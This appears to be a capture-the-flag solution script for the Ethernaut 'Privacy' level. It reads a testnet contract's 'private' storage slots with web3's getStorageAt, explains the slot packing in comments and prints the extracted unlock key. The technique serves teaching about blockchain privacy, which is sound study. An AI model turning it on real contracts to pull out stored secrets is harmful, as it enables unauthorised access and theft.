// good explanation https://medium.com/coinmonks/ethernaut-privacy-problem-7106562caee2

const fs = require('fs');

// import Web3 from 'web3';
var Web3 = require('web3');
// The contract's address
var address = '0x030311f705afa166bcc91529633f7744e11669b3';
// Run local ethereum node on localhost:8546
var myToken = fs.readFileSync("../myInfuraToken.txt",'utf8');
var web3 = new Web3(new Web3.providers.HttpProvider("https://ropsten.infura.io/"+myToken));


async function get_data (){
    for (var idx=0; idx<6; idx++){
        var data = await web3.eth.getStorageAt(address, idx);
        console.log(idx + " HEXA: " + data);
        // console.log(idx + " ASCII: "+ web3.utils.toAscii(data));
    }
}

get_data();

/*
HOW to read it:

bool public locked = true;  //rightmost bits of index[0]
uint256 public constant ID = block.timestamp; //Not indexed
uint8 private flattening = 10; //rightmost bits of index[0] - 2 hexas:8 bits
uint8 private denomination = 255; //rightmost bits of index[0] - 4 hexas:16 bits
uint16 private awkwardness = uint16(now); //bits of index[0] -6 hexas
bytes32[3] private data; //indexes 1,2,3 occupied by each piece
*/

/*
KEY: in position idx=3

used in smart contract:

bytes16(key)

You just take the first half of the bytes32 data and that’s going to be your
new bytes16 type data.
Calling the unlock method with that as an input parameter should clear up the last hurdle.

key = 0xfda21c20133e8c949cfe397e5281fffe08cb739af0e854125ef685320a9040fd

fda21c20133e8c949cfe397e5281fffe
08cb739af0e854125ef685320a9040fd

*/

console.log("key (HEXA): 0xfda21c20133e8c949cfe397e5281fffe");

/*
MESSAGE

Nothing in the ethereum blockchain is private.
The keyword private is merely an artificial construct of the Solidity language.
Web3's getStorageAt(...) can be used to read anything from storage.
It can be tricky to read what you want though, since several optimization rules and techniques
are used to compact the storage as much as possible.
It can't get much more complicated than what was exposed in this level.
For more, check out this excellent article by "Darius":
How to read Ethereum contract storage:
https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925
*/